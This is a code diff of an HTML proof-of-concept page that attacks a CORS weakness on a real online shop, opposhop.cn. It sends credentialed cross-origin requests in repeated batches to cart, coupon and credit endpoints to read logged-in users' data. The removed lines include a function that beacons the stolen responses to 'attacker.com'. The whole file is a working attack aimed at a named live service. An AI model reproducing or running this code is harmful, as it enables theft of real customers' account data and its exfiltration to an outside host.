@@ -2,56 +2,81 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>OPPO CORS PoC</title>
+<title>Stable CORS Exploit</title>
 </head>
-
 <body>
 
-<h2>OPPO CORS Data Exfiltration PoC</h2>
-<button onclick="run()">Run Exploit</button>
-
-<pre id="output">Waiting...</pre>
+<button onclick="run()">Run</button>
+<pre id="out">Idle</pre>
 
 <script>
-function exfiltrate(data) {
-    try {
-        var i = new Image();
-        i.src = "https://attacker.com/log?d=" + encodeURIComponent(data);
-    } catch(e) {}
+const endpoints = [
+    "/cn/oapi/orders/web/cart/v1/list",
+    "/cn/oapi/orders/web/cart/getCount",
+    "/cn/oapi/users/web/coupons/count?state=1",
+    "/cn/oapi/users/web/credits/getUserCredit",
+    "/cn/oapi/credits/web/credits/show"
+];
+
+function randomParam() {
+    return "_=" + Math.random().toString(36).substring(2);
 }
 
-async function request(url, name) {
+async function fetchTry(path) {
+    const url = "https://www.opposhop.cn" + path + "&" + randomParam();
+
     try {
-        let res = await fetch(url, {
-            method: "GET",
+        const res = await fetch(url, {
             credentials: "include",
-            mode: "cors"
+            cache: "no-store"
         });
 
-        let text = await res.text();
+        if (res.type === "opaque") return null;
 
-        document.getElementById("output").innerText += "\n\n[" + name + "]\n" + text;
+        if (res.status === 200) {
+            const text = await res.text();
+            if (text && !text.includes("403")) {
+                return { url, text };
+            }
+        }
+    } catch {}
 
-        exfiltrate(name + ":" + text);
+    return null;
+}
 
-    } catch (e) {
-        document.getElementById("output").innerText += "\n\n[" + name + "] ERROR\n" + e;
+async function attack(path, out) {
+    let attempts = 0;
+
+    while (true) {
+        attempts += 100;
+
+        out.textContent = "Loading " + path + " Attempts: " + attempts;
+
+        const batch = await Promise.all(
+            Array.from({ length: 100 }, () => fetchTry(path))
+        );
+
+        for (let r of batch) {
+            if (r) {
+                return { attempts, data: r.text, url: r.url };
+            }
+        }
     }
 }
 
-function run() {
+async function run() {
+    const out = document.getElementById("out");
+    let final = "";
 
-    document.getElementById("output").innerText = "Loading...";
+    for (let ep of endpoints) {
+        const res = await attack(ep, out);
 
-    request("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");
+        final += "Endpoint: " + ep + "\n";
+        final += "Attempts: " + res.attempts + "\n";
+        final += res.data + "\n\n";
 
-    request("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");
-
-    request("https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1", "coupons");
-
-    request("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit", "credit");
-
-    request("https://www.opposhop.cn/cn/oapi/credits/web/credits/show", "credits_new");
+        out.textContent = final;
+    }
 }
 </script>
 
